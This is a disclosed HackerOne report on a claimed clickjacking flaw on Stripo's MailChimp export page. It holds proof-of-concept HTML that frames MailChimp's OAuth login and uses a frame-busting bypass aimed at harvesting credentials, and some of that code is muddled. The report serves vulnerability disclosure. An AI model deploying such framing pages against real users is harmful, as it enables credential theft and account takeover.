---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '737625'
original_report_id: '737625'
title: Clickjacking on my.stripo.email for MailChimp credentials
weakness: UI Redressing (Clickjacking)
team_handle: stripo
created_at: '2019-11-14T19:41:04.154Z'
disclosed_at: '2020-01-08T08:55:51.475Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 7
asset_identifier: my.stripo.email
asset_type: URL
max_severity: critical
tags:
- hackerone
- ui-redressing-clickjacking
---

# Clickjacking on my.stripo.email for MailChimp credentials

## Metadata

- HackerOne Report ID: 737625
- Weakness: UI Redressing (Clickjacking)
- Program: stripo
- Disclosed At: 2020-01-08T08:55:51.475Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Clickjacking is a malicious hacking technique where attackers can acquire sensitive data.

Through simple social engineering techniques these links can be sent out to unsuspecting customers to steal their credentials or perform actions on their accounts.

For this example I saw that where I goto export to MailChimp that page is vulnerable to clickjacking and it is a page where the user enters a username and password which would grant me whatever access that user has if I just feed the data from a keylogger on the HTML into another page with tables to store the info.

Here is the HTML code I have embedded on my sites.google.com link:

<html>
<head>
<title>Clickjack test page</title>
</head>
<body>
<p>When you enter your e-mail and login here it will be captured and the attacker can now gain access to your customer e-mail lists</p>
	
<iframe src= "https://login.mailchimp.com/oauth2/authorize?response_type=code&client_id=350877244304&redirect_uri=https%3A%2F%2Fmy.stripo.email%2Fcabinet%2Fexportservice%2Fv1%2Fmailchimpauth.html%3FaccountId%3D2085372" width="1200" height="2500"></iframe>

	<script language="JavaScript" type="text/javascript">
    //<![CDATA[
        window.onbeforeunload = function(){
            return 'Are you sure you want to leave?';
        };
    //]]>
html2canvas(document.querySelector("#capture")).then(canvas => {
    document.body.appendChild(canvas)
});
</script>
	</body>
<script>
var prevent_bust = 0;
window.onbeforeunload = function() {
prevent_bust++;
};
setInterval(
function() {
if (prevent_bust > 0) {
prevent_bust -= 2;
window.top.location = "https://sites.google.com/view/jason-gardner-app-dev/xss-test-poc";


}
}, 1);
</script>

</html>

## Impact

An attacker could send out malicious emails to entire customer lists, delete accounts or go in and take whatever billing information exists within the MailChimp account.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
